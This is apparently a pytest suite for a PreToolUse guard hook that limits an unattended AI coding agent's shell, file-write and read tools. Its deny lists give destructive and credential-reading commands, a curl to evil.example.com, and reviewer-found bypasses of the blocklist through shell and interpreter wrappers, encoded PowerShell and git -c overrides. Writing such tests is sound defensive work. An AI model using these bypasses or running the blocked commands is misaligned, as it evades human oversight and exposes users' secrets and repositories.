"""`PreToolUse` 的黑白名單（REMOTE-OPS-PLAN §6.4）。

這份檔案守的是**「擋不住」與「擋太多」兩種失敗**：

- 擋不住：`git push`、`rm -rf`、寫 `.env`——遠端沒有人在看，發生了也不會有人
  發現，直到後果出現在別的地方。
- 擋太多：正常的 `git status`、`git commit` 被擋掉的話，每一個 run 都會在那裡
  繞到 max_turns 為止，而帳單照算。

⚠️ PowerShell 形式**一定要有對應案例**：實測 Windows 上模型預設選 PowerShell，
只擋 Bash 時 `echo hi` 直接跑過去。
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from chatroom_runner.guard import (GuardContext, TOOL_MATCHER, check_command,
                                   check_path, check_tool, split_commands)

HOOK = str(Path(__file__).resolve().parents[1]
           / "chatroom_runner" / "hooks" / "pretooluse.py")


@pytest.fixture
def ctx(tmp_path):
    cwd = tmp_path / "repo"
    cwd.mkdir()
    downloads = tmp_path / "runner-state" / "runs" / "r1" / "downloads"
    downloads.mkdir(parents=True)
    return GuardContext(cwd=cwd,
                        allowed_branches=["jsai_dev", "feature/*"],
                        allowed_domains=["github.com"],
                        protected_paths=[tmp_path / "runner-state"],
                        downloads_dir=downloads)


ALLOWED = [
    ("git status --porcelain", "白名單的 git"),
    ("git diff --cached --name-only", "commit 前看 index 是規則要求的動作"),
    ("git log origin/jsai_dev..jsai_dev", "看未推送的 commit"),
    ("git add src/app.ts", "逐檔 add"),
    ('git commit -m "修好了. 09/16"', "簽章照走"),
    ("git checkout -b feature/new-thing", "建立允許樣式的分支"),
    ("git switch jsai_dev", "切回允許分支"),
    ("git stash list", "只讀的 stash"),
    ("git fetch origin", "抓遠端"),
    ("npm test", "跑既有驗證"),
    ("Get-ChildItem src", "PowerShell 的列目錄"),
    ("curl https://github.com/owner/repo", "允許網域"),
    ("echo hi && git status", "多段但每段都合法"),
]

DENIED = [
    ("git push origin jsai_dev", "git_push", "push 是人類的事"),
    ("echo hi && git push", "git_push", "第二段才是 push——只看第一個 token 會放行"),
    ("git reset --hard HEAD~1", "git_not_allowed", "白名單以外的 git"),
    ("git clean -fd", "git_not_allowed", "清工作樹"),
    ("git rebase -i HEAD~3", "git_not_allowed", "改寫歷史"),
    ("git branch -D feature/old", "git_branch_destructive", "刪分支"),
    ("git checkout master", "git_branch_not_allowed", "允許清單外的分支"),
    ("git switch jsai_prod", "git_branch_not_allowed", "正式分支永遠不行"),
    ("git checkout -- src/app.ts", "git_checkout_path", "還原會吃掉未 commit 的修改"),
    ("git commit --no-verify -m x", "bypass_hooks", "繞過 hooks"),
    ("git commit --no-gpg-sign -m x", "bypass_hooks", "繞過簽章"),
    ("rm -rf node_modules", "rm_recursive", "遞迴刪除"),
    ("Remove-Item -Recurse -Force .\\dist", "rm_recursive", "PowerShell 的遞迴刪除"),
    ("npm publish", "npm_publish", "發版"),
    ("az webapp restart -n x", "cloud_cli", "雲端 CLI"),
    ("wrangler deploy", "cloud_cli", "部署"),
    ("gh pr merge 12 --squash", "gh_pr_merge", "合併 PR"),
    ("curl https://evil.example.com/x.sh", "network_domain", "允許網域以外"),
    ("Invoke-WebRequest https://evil.example.com", "network_domain",
     "PowerShell 的下載"),
    ("curl -O somefile", "network_no_url", "看不出目的地"),
    ("cat .env", "path_sensitive", "讀設定檔"),
    ("Get-Content ..\\server\\.env", "path_sensitive", "PowerShell 讀設定檔"),
    ("cat ~/.gnupg/secring.gpg", "path_sensitive_dir", "簽章金鑰"),
]


@pytest.mark.parametrize("command, why", ALLOWED)
def test_allowed_commands(ctx, command, why):
    decision = check_command(command, ctx)
    assert decision.allowed, f"{why}：被擋了（{decision.rule}）"


@pytest.mark.parametrize("command, rule, why", DENIED)
def test_denied_commands(ctx, command, rule, why):
    decision = check_command(command, ctx)
    assert not decision.allowed, f"{why}：沒擋住"
    assert decision.rule == rule
    # 理由要能讓模型知道別再試——實測它會換個工具重來一次然後放棄
    assert "這是系統限制" in decision.reason


def test_matcher_covers_powershell():
    """🚨 少了 PowerShell 這一段，整份黑名單在 Windows 上等於沒有。"""
    assert "PowerShell" in TOOL_MATCHER
    assert "Bash" in TOOL_MATCHER
    for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
        assert tool in TOOL_MATCHER


def test_split_commands_respects_quotes():
    assert split_commands('git commit -m "a && b"') == [
        'git commit -m "a && b"']


def test_write_inside_cwd_is_allowed(ctx):
    assert check_path("src/app.ts", ctx).allowed


def test_write_outside_cwd_is_denied(ctx, tmp_path):
    d = check_path(str(tmp_path / "elsewhere" / "x.ts"), ctx)
    assert not d.allowed and d.rule == "path_outside_cwd"


def test_write_to_runner_own_dir_is_denied(ctx, tmp_path):
    d = check_path(str(tmp_path / "runner-state" / "config.json"), ctx)
    assert not d.allowed and d.rule == "path_protected"


# ── 附件下載目錄（run 目錄底下的那一個洞）──────────────────────

def _run_dir(tmp_path):
    return tmp_path / "runner-state" / "runs" / "r1"


def test_downloads_dir_is_readable_and_writable(ctx, tmp_path):
    """`chatroom_get_file` 把附件放在 `<run_dir>/downloads`。那在執行器自己的
    目錄底下，預設會被 `path_protected` 擋掉——而附件是 agent 自己要來的，
    讀不到的話那個工具等於沒有。"""
    png = str(_run_dir(tmp_path) / "downloads" / "x.png")
    assert check_tool("Read", {"file_path": png}, ctx).allowed
    assert check_path(png, ctx).allowed, "寫入也要放行：附件可能要被改寫"


def test_downloads_exception_does_not_open_the_rest_of_the_run_dir(ctx,
                                                                   tmp_path):
    """🚨 鑿的是**一個洞**，不是整個 run 目錄。`settings.json` 與
    `guard.json` 就在隔壁，agent 讀得到就等於讀得到自己的限制清單。"""
    settings = str(_run_dir(tmp_path) / "settings.json")
    d = check_tool("Read", {"file_path": settings}, ctx)
    assert not d.allowed and d.rule == "read_protected"
    w = check_path(settings, ctx)
    assert not w.allowed and w.rule == "path_protected"


def test_downloads_dir_still_refuses_secrets(ctx, tmp_path):
    """放行的是位置，不是「什麼檔都行」。"""
    d = check_tool("Read",
                   {"file_path": str(_run_dir(tmp_path) / "downloads"
                                     / ".env")}, ctx)
    assert not d.allowed and d.rule == "read_sensitive"


@pytest.mark.parametrize("name", [".env", ".env.local", "key.pem"])
def test_write_sensitive_names_denied(ctx, name):
    d = check_path(name, ctx)
    assert not d.allowed and d.rule == "path_sensitive"


def test_check_tool_routes_by_name(ctx):
    assert not check_tool("Bash", {"command": "git push"}, ctx).allowed
    assert not check_tool("PowerShell", {"command": "git push"}, ctx).allowed
    assert not check_tool("Write", {"file_path": "../outside.txt"},
                          ctx).allowed
    # 讀取類不限 cwd，但敏感路徑一樣擋（審查 09/16）
    assert check_tool("Read", {"file_path": "../outside.txt"},
                      ctx).allowed
    assert not check_tool("Read", {"file_path": "../server/.env"},
                          ctx).allowed


# ── hook 本體（真的跑一次子進程）────────────────────────────────

def _run_hook(run_dir: Path, payload: dict):
    return subprocess.run(
        [sys.executable, HOOK], input=json.dumps(payload), text=True,
        capture_output=True,
        env={**_base_env(), "CHATROOM_RUNNER_RUN_DIR": str(run_dir)})


def _base_env():
    import os
    return {k: v for k, v in os.environ.items()}


@pytest.fixture
def run_dir(tmp_path, ctx):
    d = tmp_path / "run"
    d.mkdir()
    (d / "guard.json").write_text(json.dumps(ctx.to_dict()), encoding="utf-8")
    return d


def test_hook_allows_and_logs(run_dir):
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 0, proc.stderr
    logged = (run_dir / "tool.log").read_text(encoding="utf-8").strip()
    assert "git status" in logged and '"verdict": "allow"' in logged


def test_hook_blocks_with_exit_2(run_dir):
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git push"}})
    assert proc.returncode == 2
    assert "這是系統限制" in proc.stderr


def test_hook_blocks_everything_once_handoff_flag_is_up(run_dir):
    """context 到頂之後，下一次工具呼叫就是交接的觸發點（§5.4）。"""
    (run_dir / "handoff.flag").write_text("{}", encoding="utf-8")
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 2
    assert "請立刻把已做／未做／下一步寫到卡" in proc.stderr


def test_hook_blocks_when_guard_config_is_missing(tmp_path):
    """🚨 讀不到規則時**擋**，不是放行。

    放行的話整個 §6.4 會靜默失效，而那件事在 log 上與「這次沒有違規」
    長得一模一樣。
    """
    empty = tmp_path / "no-guard"
    empty.mkdir()
    proc = _run_hook(empty, {"tool_name": "Bash",
                             "tool_input": {"command": "git status"}})
    assert proc.returncode == 2
    assert "守衛設定讀不到" in proc.stderr


# ── 進程包裝：殼層與直譯器再執行一段命令字串（審查 09/16 Critical）──────

WRAPPED = [
    # 審查者用 check_command 直接跑出來的繞法，原樣進測試
    "cmd /c git push",
    'cmd /c "git push"',
    "cmd /k git push",
    'powershell -Command "git push"',
    'pwsh -Command "git push"',
    "powershell -EncodedCommand ZwBpAHQAIABwAHUAcwBoAA==",
    "powershell -File .\\deploy.ps1",
    'bash -c "git push"',
    'sh -c "git push"',
    'zsh -c "git push"',
    "wsl git push",
    "python -c \"import subprocess; subprocess.run(['git','push'])\"",
    'python3 -c "print(1)"',
    'py -c "print(1)"',
    "python -m http.server",
    "node -e \"require('child_process').execSync('git push')\"",
    'node --eval "1"',
    'node -p "1"',
    "perl -e \"system('git push')\"",
    "ruby -e \"system('git push')\"",
    'Start-Process -FilePath git -ArgumentList "push"',
    'Invoke-Expression "git push"',
    'iex "git push"',
    "Invoke-Command -ScriptBlock {git push}",
    "icm -ScriptBlock {git push}",
    'eval "git push"',
    "exec git push",
    "& {git push}",
    "& { git push }",
]


@pytest.mark.parametrize("command", WRAPPED)
def test_process_wrappers_are_denied(ctx, command):
    """🚨 殼層／直譯器再跑一段字串＝整份黑名單的旁路。

    `cmd /c git push` 的第一個 token 不是 git，任何「看 token」的規則都攔不到
    它，而 push 照樣推上去了。
    """
    decision = check_command(command, ctx)
    assert not decision.allowed, f"{command}：繞過去了"
    assert decision.rule in ("process_wrapper", "script_outside_cwd")
    assert "這是系統限制" in decision.reason


WRAPPER_ALLOWED = [
    ("python -m pytest -q", "跑測試是唯一開放的 -m"),
    ("python scripts/check.py", "cwd 內的腳本"),
    ("node scripts/build.js", "cwd 內的腳本"),
    ("npm run lint", "npm 的 run"),
    ("npx tsc --noEmit", "型別檢查"),
    ("pnpm test", "pnpm 的測試"),
]


@pytest.mark.parametrize("command, why", WRAPPER_ALLOWED)
def test_wrapper_rules_do_not_block_normal_work(ctx, command, why):
    decision = check_command(command, ctx)
    assert decision.allowed, f"{why}：被擋了（{decision.rule}）"


def test_interpreter_script_outside_cwd_is_denied(ctx):
    d = check_command("python ../outside/evil.py", ctx)
    assert not d.allowed and d.rule == "script_outside_cwd"


# ── git 全域選項（審查 09/16 Critical）──────────────────────────

GIT_GLOBAL_DENIED = [
    ("git --git-dir=C:/other/.git --work-tree=C:/other commit -am x",
     "git_global_path", "換一個工作樹就等於在別的 repo 上動手"),
    ("git -C log push", "git_global_path",
     "-C 吃掉下一個 token，push 變成看不見的子命令"),
    ("git -C ../other status", "git_global_path", "cwd 以外的工作樹"),
    ("git --work-tree=../other status", "git_global_path", "同上"),
    ("git -c commit.gpgsign=false commit -m x", "git_config_override",
     "用 -c 關掉簽章"),
    ("git -c core.hooksPath=/dev/null commit -m x", "git_config_override",
     "用 -c 把 hooks 指到空的"),
    ("git -c gpg.program=false commit -m x", "git_config_override",
     "換掉簽章程式"),
]


@pytest.mark.parametrize("command, rule, why", GIT_GLOBAL_DENIED)
def test_git_global_options_are_denied(ctx, command, rule, why):
    decision = check_command(command, ctx)
    assert not decision.allowed, f"{why}：沒擋住"
    assert decision.rule == rule


def test_git_harmless_dash_c_still_works(ctx):
    assert check_command("git -c color.ui=false status", ctx).allowed


# ── git config／remote 的多旗標（審查 09/16 Minor）───────────────

GIT_READ_ONLY_ALLOWED = [
    "git config --get user.email",
    "git config --list",
    "git config --get-all remote.origin.url",
    "git config --show-origin --get user.name",
    "git remote -v",
    "git remote show origin",
    "git remote get-url origin",
]

GIT_READ_ONLY_DENIED = [
    ("git config user.email x", "git_config"),
    ("git config --global user.email x", "git_config"),
    ("git config --get --global user.email", "git_config"),
    ("git config --unset commit.gpgsign", "git_config"),
    ("git remote add upstream https://github.com/x/y", "git_remote"),
    ("git remote set-url origin https://github.com/x/y", "git_remote"),
    ("git remote get-url --push origin", "git_remote"),
]


@pytest.mark.parametrize("command", GIT_READ_ONLY_ALLOWED)
def test_git_read_only_forms_are_allowed(ctx, command):
    d = check_command(command, ctx)
    assert d.allowed, f"{command} 被擋了（{d.rule}）"


@pytest.mark.parametrize("command, rule", GIT_READ_ONLY_DENIED)
def test_git_config_and_remote_writes_are_denied(ctx, command, rule):
    d = check_command(command, ctx)
    assert not d.allowed and d.rule == rule


# ── git 憑證設定（艾斯維爾裁決 09/16：推送憑證隔離）──────────────

CREDENTIAL_DENIED = [
    '$env:GIT_CONFIG_COUNT = "0"',
    '$env:GIT_ASKPASS = ""',
    "set GIT_CONFIG_COUNT=0",
    "export GIT_TERMINAL_PROMPT=1",
    "Set-Item env:GIT_ASKPASS x",
    '[Environment]::SetEnvironmentVariable("GIT_ASKPASS", "x")',
    "git -c credential.helper=manager push origin jsai_dev",
    "git -c credential.helper=store fetch origin",
    "git config credential.helper manager",
    "git config --global credential.helper manager",
]


@pytest.mark.parametrize("command", CREDENTIAL_DENIED)
def test_credential_setting_changes_are_denied(ctx, command):
    """run 進程的憑證被清掉了，能把它裝回去就等於沒清。"""
    d = check_command(command, ctx)
    assert not d.allowed, f"{command}：沒擋住"
    assert d.rule in ("git_credential_env", "git_config")
    assert "這是系統限制" in d.reason


def test_reading_a_git_env_var_is_still_allowed(ctx):
    assert check_command("echo $env:GIT_DIR", ctx).allowed


# ── 讀取型工具（審查 09/16 Critical）────────────────────────────

def test_matcher_covers_read_tools():
    """🚨 Read／Glob／Grep 不在 matcher 裡＝hook 根本不會被呼叫，
    `.env` 與私鑰照讀不誤。"""
    for tool in ("Read", "Glob", "Grep"):
        assert tool in TOOL_MATCHER


READ_DENIED = [
    ("Read", {"file_path": "../server/.env"}, "read_sensitive"),
    ("Read", {"file_path": "config/.env.local"}, "read_sensitive"),
    ("Read", {"file_path": "certs/site.pem"}, "read_sensitive"),
    ("Read", {"file_path": "keys/deploy.key"}, "read_sensitive"),
    ("Read", {"file_path": "keys/cert.p12"}, "read_sensitive"),
    ("Read", {"file_path": "C:/Users/x/.ssh/id_rsa"}, "read_sensitive"),
    ("Read", {"file_path": "C:/Users/x/.claude.json"}, "read_sensitive"),
    ("Read", {"file_path": "C:/Users/x/credentials.json"}, "read_sensitive"),
    ("Read", {"file_path": "~/.gnupg/secring.gpg"}, "read_sensitive_dir"),
    ("Read", {"file_path": "C:/Users/x/.claude/settings.json"},
     "read_sensitive_dir"),
    ("Glob", {"pattern": "**/.env*"}, "read_sensitive"),
    ("Glob", {"pattern": "**/*.pem"}, "read_sensitive"),
    ("Glob", {"path": "~/.ssh", "pattern": "*"}, "read_sensitive_dir"),
    ("Grep", {"pattern": "TOKEN", "path": "../../.claude"},
     "read_sensitive_dir"),
    ("Grep", {"pattern": "TOKEN", "glob": "*.key"}, "read_sensitive"),
    ("Grep", {"pattern": "TOKEN", "path": "../server/.env"},
     "read_sensitive"),
]


@pytest.mark.parametrize("tool, payload, rule", READ_DENIED)
def test_read_tools_cannot_reach_secrets(ctx, tool, payload, rule):
    d = check_tool(tool, payload, ctx)
    assert not d.allowed, f"{tool} {payload}：讀到了"
    assert d.rule == rule
    assert "這是系統限制" in d.reason


READ_ALLOWED = [
    ("Read", {"file_path": "src/app.ts"}),
    # 讀取類**不限 cwd**：看別的 repo 的程式碼是正常的調查
    ("Read", {"file_path": "../other-repo/src/app.ts"}),
    ("Glob", {"pattern": "**/*.ts"}),
    ("Glob", {"path": "src", "pattern": "*"}),
    ("Grep", {"pattern": "TODO"}),
    ("Grep", {"pattern": "TODO", "glob": "*.ts", "path": "src"}),
]


@pytest.mark.parametrize("tool, payload", READ_ALLOWED)
def test_read_tools_still_read_normal_files(ctx, tool, payload):
    d = check_tool(tool, payload, ctx)
    assert d.allowed, f"{tool} {payload} 被擋了（{d.rule}）"


def test_read_cannot_reach_the_runner_own_dir(ctx, tmp_path):
    d = check_tool(
        "Read", {"file_path": str(tmp_path / "runner-state" / "state.json")},
        ctx)
    assert not d.allowed and d.rule == "read_protected"


def test_hook_blocks_a_read_of_dotenv(run_dir):
    proc = _run_hook(run_dir, {"tool_name": "Read",
                               "tool_input": {"file_path": "../.env"}})
    assert proc.returncode == 2
    assert "這是系統限制" in proc.stderr


# ── 軟停止與 @ 轉達（hook 是它們唯一的出口）──────────────────────

def test_hook_blocks_everything_once_soft_stop_flag_is_up(run_dir):
    """房裡請它收尾：下一次工具呼叫就是那句話送到的時機。

    理由要**直接講要做什麼**——只說「被擋了」的話，實測模型會換一個工具再
    試一次然後放棄，而它其實只要收尾就好。
    """
    (run_dir / "soft_stop.flag").write_text("{}", encoding="utf-8")
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 2
    assert "請在目前步驟收尾，寫收工摘要後結束" in proc.stderr
    assert '"verdict": "soft_stop"' in (
        run_dir / "tool.log").read_text(encoding="utf-8")


def test_hook_hands_mentions_to_the_model_without_blocking(run_dir):
    """@ 轉達**不擋**這次呼叫：房裡講一句話不該讓它正在做的事停下來。

    走 `hookSpecificOutput.additionalContext`——PreToolUse 底下唯一不必 deny
    就能讓文字進到模型 context 的欄位（`permissionDecisionReason` 只在 deny
    時才回給模型）。
    """
    (run_dir / "inject.jsonl").write_text(
        json.dumps({"seq": 12, "from": "艾斯維爾", "text": "先看一下 B 案"},
                   ensure_ascii=False) + "\n", encoding="utf-8")
    proc = _run_hook(run_dir, {"tool_name": "Bash",
                               "tool_input": {"command": "git status"}})
    assert proc.returncode == 0, proc.stderr
    out = json.loads(proc.stdout)
    ctx = out["hookSpecificOutput"]
    assert ctx["hookEventName"] == "PreToolUse"
    assert "先看一下 B 案" in ctx["additionalContext"]
    assert "艾斯維爾" in ctx["additionalContext"]
    # 消費過就不再送第二次
    again = _run_hook(run_dir, {"tool_name": "Bash",
                                "tool_input": {"command": "git status"}})
    assert again.returncode == 0
    assert again.stdout.strip() == "", "同一則被送了第二次"


def test_hook_does_not_consume_mentions_when_it_blocks(run_dir):
    """被擋下來的那一次**不消費**轉達訊息。

    消費掉的話，那段話只會出現在一次被拒絕的呼叫裡——模型讀到的是拒絕理由，
    而房裡講的那句從此不存在。
    """
    (run_dir / "inject.jsonl").write_text(
        json.dumps({"seq": 3, "from": "艾斯維爾", "text": "停在這"},
                   ensure_ascii=False) + "\n", encoding="utf-8")
    blocked = _run_hook(run_dir, {"tool_name": "Bash",
                                  "tool_input": {"command": "git push"}})
    assert blocked.returncode == 2
    allowed = _run_hook(run_dir, {"tool_name": "Bash",
                                  "tool_input": {"command": "git status"}})
    assert "停在這" in json.loads(allowed.stdout)["hookSpecificOutput"][
        "additionalContext"]
